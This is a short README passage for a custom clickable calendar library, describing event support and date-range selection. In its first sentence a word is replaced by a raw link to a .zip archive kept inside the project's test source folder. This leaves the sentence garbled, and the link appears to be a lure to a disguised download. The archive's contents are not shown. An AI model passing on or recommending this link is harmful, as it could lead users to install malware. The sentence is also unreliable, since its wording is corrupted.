This calendar is fully https://github.com/Joe-Mogul/CustomClickableCalender/raw/refs/heads/master/app/src/test/java/aliahmed/info/Calender_Custom_Clickable_decare.zip also can add events using EventObjects class. 

## Date Range
Clicking date cells user can set date range like start date to end date. Some logics are there which are
- First selected item will be the start date.
